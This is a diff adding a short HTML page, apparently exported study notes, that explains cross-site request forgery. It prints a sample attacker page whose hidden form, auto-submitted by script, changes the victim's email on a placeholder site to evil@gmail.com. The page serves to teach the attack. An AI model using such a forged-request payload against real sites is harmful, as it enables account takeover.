@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>How does CSRF work?</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>How does CSRF work?</h1><br/><p>Example code for attacker web page: </p><p></p><p>		&lt;form action=&quot;https://vulnerable.com/email/change&quot; method=&quot;POST&quot;&gt;</p><p>            &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;evil@gmail.com&quot; /&gt;</p><p>        &lt;/form&gt;</p><p>        &lt;script&gt;</p><p>            document.forms[0].submit();</p><p>        &lt;/script&gt;</p><p>        </p><p>This web page is targeting the property “email” on the website vulnerable.com/email/change and sets it to evil@gmail.com as soon as the page loads.</p></div>
+</body>
+</html>
